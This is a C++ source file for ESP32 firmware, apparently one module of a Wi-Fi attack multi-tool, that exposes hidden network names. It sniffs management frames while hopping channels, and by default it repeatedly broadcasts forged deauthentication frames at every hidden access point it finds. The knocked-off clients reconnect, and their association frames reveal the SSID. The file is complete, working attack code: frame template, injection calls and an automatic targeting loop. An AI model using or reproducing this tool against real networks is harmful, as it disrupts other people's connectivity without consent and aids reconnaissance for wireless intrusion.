/*
 * Hidden SSID Reveal — Hydra. See header for the technique.
 *
 * Architecture mirrors ap_scan.cpp + esppwnagotchi.cpp:
 *   - WIFI_MODE_AP (so esp_wifi_80211_tx can send deauth frames)
 *   - promiscuous, mgmt-frame filter
 *   - channel-hop loop
 *   - mgmt sniffer callback maintains a fixed-size table of hidden BSSIDs
 *     and upgrades their SSID field whenever a non-beacon frame reveals it
 */

#include "hidden_reveal.h"
#include "wificonfig.h"
#include "utils.h"
#include "Touchscreen.h"

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_random.h>
#include <string.h>

#define DARK_GRAY 0x4208

#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5

namespace HiddenReveal {

// ─── State ──────────────────────────────────────────────────────────────────

// Sized to fit comfortably in DRAM alongside ESPPwn's PCAP ring + PMKID
// dedupe + the exclude list + the rest of the cifertech BSS. 6 hidden
// networks is enough for typical environments; very dense areas may
// silently drop the 7th+ but the existing ones still reveal.
#define MAX_HIDDEN 6
#define SSID_BUF   24

struct __attribute__((packed)) HiddenAP {
  uint8_t  bssid[6];
  uint8_t  channel;
  int8_t   rssi;
  char     ssid[SSID_BUF];  // empty until revealed
  uint8_t  state;           // 0=hidden, 1=revealed
  uint32_t lastSeen;
};

static volatile HiddenAP hidden[MAX_HIDDEN];
static volatile int hiddenCount = 0;
static portMUX_TYPE listMux = portMUX_INITIALIZER_UNLOCKED;

static uint8_t currentChannel = 1;
static uint32_t lastHopMs = 0;
static const uint32_t HOP_DWELL_MS = 500;

static bool deauthActive = true;
static uint32_t lastDeauthMs = 0;
static const uint32_t DEAUTH_INTERVAL_MS = 2000;
static uint32_t totalDeauthsSent = 0;

static uint32_t lastUiUpdate = 0;
static bool toggleHeldFromPrev = true;
static uint32_t lastBtnMs = 0;
static const uint32_t BTN_DEBOUNCE_MS = 200;

// Deauth frame template (broadcast to a BSSID's clients)
static uint8_t deauth_frame[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // dst = broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src = bssid
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // bssid
  0xf0, 0xff, 0x02, 0x00               // seq + reason 7 (class3 from non-associated)
};

// ─── Callback-side helpers (IRAM-safe) ──────────────────────────────────────

// Check if `ssid` of length `len` is "hidden" — empty, or all 0x00 bytes,
// or all space/null. Returns true if hidden.
static inline bool ssidIsHidden(const uint8_t* ssid, uint8_t len) {
  if (len == 0) return true;
  for (uint8_t i = 0; i < len; i++) {
    if (ssid[i] >= 32 && ssid[i] < 127) return false;
  }
  return true;
}

static inline int findHiddenByBssid(const uint8_t* bssid) {
  for (int i = 0; i < hiddenCount; i++) {
    bool match = true;
    for (int k = 0; k < 6; k++) {
      if (hidden[i].bssid[k] != bssid[k]) { match = false; break; }
    }
    if (match) return i;
  }
  return -1;
}

// Record (or update) a hidden BSSID. Called from the promiscuous callback,
// so we keep the work small and stay inside a critical section.
static void recordHidden(const uint8_t* bssid, uint8_t channel, int8_t rssi) {
  portENTER_CRITICAL_ISR(&listMux);
  int idx = findHiddenByBssid(bssid);
  uint32_t now = millis();
  if (idx < 0) {
    if (hiddenCount < MAX_HIDDEN) {
      idx = hiddenCount++;
      for (int k = 0; k < 6; k++) hidden[idx].bssid[k] = bssid[k];
      hidden[idx].channel = channel;
      hidden[idx].rssi = rssi;
      hidden[idx].ssid[0] = '\0';
      hidden[idx].state = 0;  // hidden
    }
  }
  if (idx >= 0) {
    hidden[idx].lastSeen = now;
    if (rssi > hidden[idx].rssi) hidden[idx].rssi = rssi;
    if (channel != 0) hidden[idx].channel = channel;
  }
  portEXIT_CRITICAL_ISR(&listMux);
}

// Reveal: set SSID on the matching hidden entry. Only stores printable bytes.
static void revealSsid(const uint8_t* bssid, const uint8_t* ssid, uint8_t ssidLen) {
  if (ssidLen == 0 || ssidLen > 32) return;
  if (ssidIsHidden(ssid, ssidLen)) return;  // not a real reveal
  portENTER_CRITICAL_ISR(&listMux);
  int idx = findHiddenByBssid(bssid);
  if (idx >= 0 && hidden[idx].state == 0) {
    int n = ssidLen;
    if (n > SSID_BUF - 1) n = SSID_BUF - 1;
    for (int k = 0; k < n; k++) {
      uint8_t c = ssid[k];
      hidden[idx].ssid[k] = (c >= 32 && c < 127) ? (char)c : '?';
    }
    hidden[idx].ssid[n] = '\0';
    hidden[idx].state = 1;
  }
  portEXIT_CRITICAL_ISR(&listMux);
}

// ─── Promisc RX callback (runs in WiFi driver task) ─────────────────────────

static void IRAM_ATTR mgmtSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf || type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  uint8_t fc0 = p[0];
  // addr1 = receiver (offset 4), addr2 = sender (offset 10), addr3 = BSSID (offset 16)
  const uint8_t* addr1 = p + 4;
  const uint8_t* addr2 = p + 10;
  const uint8_t* addr3 = p + 16;
  int8_t rssi = pkt->rx_ctrl.rssi;
  uint8_t channel = pkt->rx_ctrl.channel;

  switch (fc0) {
    case 0x80: {  // Beacon — fixed 12-byte body, SSID IE at offset 36
      if (len < 38) return;
      uint8_t ssidLen = p[37];
      if (ssidLen > 32) return;
      if (38 + ssidLen > len) return;
      const uint8_t* ssid = p + 38;
      if (ssidIsHidden(ssid, ssidLen)) {
        recordHidden(addr3, channel, rssi);
      }
      // If a previously-hidden AP starts broadcasting with a real SSID,
      // we can also upgrade it here. Some APs randomly broadcast both.
      else {
        revealSsid(addr3, ssid, ssidLen);
      }
      break;
    }
    case 0x50: {  // Probe Response — same layout as beacon
      if (len < 38) return;
      uint8_t ssidLen = p[37];
      if (ssidLen > 32) return;
      if (38 + ssidLen > len) return;
      const uint8_t* ssid = p + 38;
      // Probe responses come from APs, including hidden ones replying to
      // a directed probe — the SSID field is real here.
      revealSsid(addr3, ssid, ssidLen);
      break;
    }
    case 0x40: {  // Probe Request — fixed body length 0, SSID IE at offset 24
      // Probe requests come from CLIENTS, addr3 is usually the broadcast
      // address. The SSID IE carries the name the client is looking for —
      // if the same client also associates to a hidden BSSID we'll learn
      // the BSSID. Hard to attribute reliably, so we don't record from
      // here unless we've already seen the client associate with a hidden
      // BSSID (tracked below via 0x00/0x20 frames). Skipping for now.
      break;
    }
    case 0x00: {  // Association Request — body: capab(2) + listen(2) + IEs
      if (len < 24 + 4 + 2) return;
      int iePos = 24 + 4;
      if (p[iePos] != 0 /* SSID tag */) break;
      uint8_t ssidLen = p[iePos + 1];
      if (ssidLen > 32) return;
      if (iePos + 2 + ssidLen > len) return;
      // addr1 = AP, addr2 = client, addr3 = BSSID. The SSID in the IE is
      // the network the client is asking to join — that's the real name
      // of the hidden BSSID it's connecting to.
      revealSsid(addr1, p + iePos + 2, ssidLen);
      break;
    }
    case 0x20: {  // Reassociation Request — body: capab(2)+listen(2)+currAP(6)+IEs
      if (len < 24 + 10 + 2) return;
      int iePos = 24 + 10;
      if (p[iePos] != 0) break;
      uint8_t ssidLen = p[iePos + 1];
      if (ssidLen > 32) return;
      if (iePos + 2 + ssidLen > len) return;
      revealSsid(addr1, p + iePos + 2, ssidLen);
      break;
    }
    default:
      break;
  }

  // Touch addr2 to silence unused-variable warning if compiler is strict.
  (void)addr2;
}

// ─── Deauth helper ──────────────────────────────────────────────────────────

static void sendDeauthToBssid(const uint8_t* bssid, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 6; i++) {
    deauth_frame[10 + i] = bssid[i];
    deauth_frame[16 + i] = bssid[i];
  }
  // Burst 3 frames, then a quick second burst with reason code 1 in case
  // some firmware ignores reason 7. The reason byte sits at offset 24.
  for (int b = 0; b < 3; b++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    totalDeauthsSent++;
  }
}

// ─── UI ─────────────────────────────────────────────────────────────────────

#define LIST_TOP_Y 60
#define ROW_HEIGHT 14

static void drawTopStatus() {
  tft.fillRect(35, 20, 205, 16, DARK_GRAY);
  tft.setTextFont(1); tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(35, 24);
  int rev = 0;
  for (int i = 0; i < hiddenCount; i++) if (hidden[i].state == 1) rev++;
  tft.printf("ch%2d  hid:%d  rev:%d  dx:%u",
             (int)currentChannel, (int)hiddenCount, rev, (unsigned)totalDeauthsSent);
}

static void drawList() {
  tft.fillRect(0, 40, tft.width(), 16, DARK_GRAY);
  tft.setTextFont(1); tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(2, 44);
  tft.print("Hidden SSID Reveal");
  tft.setTextColor(deauthActive ? TFT_RED : TFT_DARKGREY);
  tft.setCursor(150, 44);
  tft.print(deauthActive ? "DEAUTH ON" : "DEAUTH OFF");

  tft.fillRect(0, LIST_TOP_Y, tft.width(), tft.height() - LIST_TOP_Y, TFT_BLACK);
  tft.setTextFont(1); tft.setTextSize(1);

  // Snapshot the list under the mutex to avoid tearing.
  HiddenAP snap[MAX_HIDDEN];
  int n;
  portENTER_CRITICAL(&listMux);
  n = hiddenCount;
  for (int i = 0; i < n; i++) {
    snap[i] = const_cast<HiddenAP&>(hidden[i]);
  }
  portEXIT_CRITICAL(&listMux);

  if (n == 0) {
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor(2, LIST_TOP_Y + 10);
    tft.print("No hidden networks yet.");
    tft.setCursor(2, LIST_TOP_Y + 25);
    tft.print("Scanning all channels...");
    tft.setCursor(2, LIST_TOP_Y + 50);
    tft.setTextColor(TFT_WHITE);
    tft.print("[UP]     Toggle deauth");
    tft.setCursor(2, LIST_TOP_Y + 65);
    tft.print("[SELECT] Exit");
    return;
  }

  int maxRows = (tft.height() - LIST_TOP_Y) / ROW_HEIGHT;
  if (n > maxRows) n = maxRows;
  for (int i = 0; i < n; i++) {
    int y = LIST_TOP_Y + i * ROW_HEIGHT;
    if (snap[i].state == 1) {
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setCursor(2, y);
      tft.printf("%02x:%02x:%02x:%02x:%02x:%02x c%-2d %s",
                 snap[i].bssid[0], snap[i].bssid[1], snap[i].bssid[2],
                 snap[i].bssid[3], snap[i].bssid[4], snap[i].bssid[5],
                 (int)snap[i].channel, snap[i].ssid);
    } else {
      tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
      tft.setCursor(2, y);
      tft.printf("%02x:%02x:%02x:%02x:%02x:%02x c%-2d <hidden> %ddBm",
                 snap[i].bssid[0], snap[i].bssid[1], snap[i].bssid[2],
                 snap[i].bssid[3], snap[i].bssid[4], snap[i].bssid[5],
                 (int)snap[i].channel, (int)snap[i].rssi);
    }
  }
}

// ─── Setup / Loop ───────────────────────────────────────────────────────────

void hiddenRevealSetup() {
  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);

  hiddenCount = 0;
  currentChannel = 1;
  lastHopMs = 0;
  lastDeauthMs = 0;
  totalDeauthsSent = 0;
  deauthActive = true;
  toggleHeldFromPrev = true;

  // Bring WiFi up in AP mode so we can both promiscuous-sniff and inject
  // deauth frames. Mirror of the sequence in esppwnagotchi.cpp / ap_scan.cpp:
  // stop -> mode -> start, then filter+cb -> enable promiscuous.
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&mgmtSniffer);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);

  Serial.println("[HiddenReveal] ready, hopping ch1..11");

  float v = readBatteryVoltage();
  drawStatusBar(v, false);
  drawList();
  drawTopStatus();
  lastUiUpdate = millis();
}

void hiddenRevealLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  uint32_t now = millis();

  // Toggle deauth on UP press
  bool up = !pcf.digitalRead(BTN_UP);
  if (toggleHeldFromPrev) {
    if (!up) toggleHeldFromPrev = false;
  } else if (up && now - lastBtnMs > BTN_DEBOUNCE_MS) {
    deauthActive = !deauthActive;
    lastBtnMs = now;
    toggleHeldFromPrev = true;
    Serial.printf("[HiddenReveal] deauth %s\n", deauthActive ? "ON" : "OFF");
    drawTopStatus();
  }

  // Channel hop
  if (now - lastHopMs > HOP_DWELL_MS) {
    currentChannel = (currentChannel % 11) + 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    lastHopMs = now;
  }

  // Periodically deauth every known hidden BSSID to force their clients to
  // reconnect — which generates Probe Req / Assoc Req frames carrying the
  // real SSID that the mgmt sniffer captures.
  if (deauthActive && now - lastDeauthMs > DEAUTH_INTERVAL_MS) {
    lastDeauthMs = now;
    // Snapshot under mutex to avoid stale pointers.
    uint8_t bssids[MAX_HIDDEN][6];
    uint8_t channels[MAX_HIDDEN];
    int n;
    portENTER_CRITICAL(&listMux);
    n = hiddenCount;
    for (int i = 0; i < n; i++) {
      for (int k = 0; k < 6; k++) bssids[i][k] = hidden[i].bssid[k];
      channels[i] = hidden[i].channel;
    }
    portEXIT_CRITICAL(&listMux);

    for (int i = 0; i < n; i++) {
      // Only deauth still-hidden BSSIDs — once revealed, no point harassing.
      bool stillHidden;
      portENTER_CRITICAL(&listMux);
      stillHidden = (i < hiddenCount && hidden[i].state == 0);
      portEXIT_CRITICAL(&listMux);
      if (!stillHidden) continue;
      sendDeauthToBssid(bssids[i], channels[i]);
    }
    // Restore the channel-hop cadence — we just bounced through targets.
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  }

  // UI refresh @ ~3 Hz
  if (now - lastUiUpdate > 300) {
    drawList();
    drawTopStatus();
    lastUiUpdate = now;
  }

  delay(5);
}

}  // namespace HiddenReveal
